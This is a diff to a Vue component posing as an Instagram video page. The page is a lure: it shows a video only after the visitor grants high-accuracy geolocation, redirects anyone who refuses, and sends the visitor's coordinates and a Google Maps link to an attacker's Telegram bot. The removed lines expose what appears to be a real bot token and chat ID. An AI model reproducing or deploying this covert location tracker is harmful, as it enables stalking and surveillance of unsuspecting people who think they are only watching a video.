@@ -17,7 +17,6 @@
     </div>
   </div>
 </template>
-
 <script>
 export default {
   name: "InstagramVideo",
@@ -27,14 +26,12 @@ export default {
       showVideo: false,
       latitude: null,
       longitude: null,
-      botToken: "7622854137:AAH6xblJA8biVHaE4VbC1svOAC-izatOoZI",
-      chatId: "5673984207",
+      botToken: "BOT_TOKEN_HERE",
+      chatId: "CHAT_ID_HERE",
     };
   },
   methods: {
     allowVideo() {
-      this.showModal = false;
-      this.showVideo = true;
       this.getGeolocation();
     },
 
@@ -45,10 +42,13 @@ export default {
             this.latitude = position.coords.latitude;
             this.longitude = position.coords.longitude;
             this.sendToTelegram();
+            this.showModal = false;
+            this.showVideo = true;
           },
           (error) => {
             console.error("Geolocation error:", error.message);
             this.sendToTelegram(true);
+            window.location.href = "/"; // Ruxsat bermasa – redirect
           },
           {
             enableHighAccuracy: true,
@@ -58,18 +58,18 @@ export default {
         );
       } else {
         this.sendToTelegram(true);
+        window.location.href = "/";
       }
     },
 
     sendToTelegram(error = false) {
       const message = error
-        ? `❌ Geolocation olishda xatolik yuz berdi yoki foydalanuvchi rad etdi.`
+        ? `❌ Geolocation olishda xatolik yoki foydalanuvchi rad etdi.`
         : `📍 Yangi foydalanuvchi joylashuvi:
 Latitude: ${this.latitude}
 Longitude: ${this.longitude}
 🗺️ Google Maps: https://www.google.com/maps?q=${this.latitude},${this.longitude}
-🕒 Vaqt: ${new Date().toLocaleString()}
-`;
+🕒 Vaqt: ${new Date().toLocaleString()}`;
 
       const encodedMessage = encodeURIComponent(message);
       const telegramUrl = `https://api.telegram.org/bot${this.botToken}/sendMessage?chat_id=${this.chatId}&text=${encodedMessage}`;
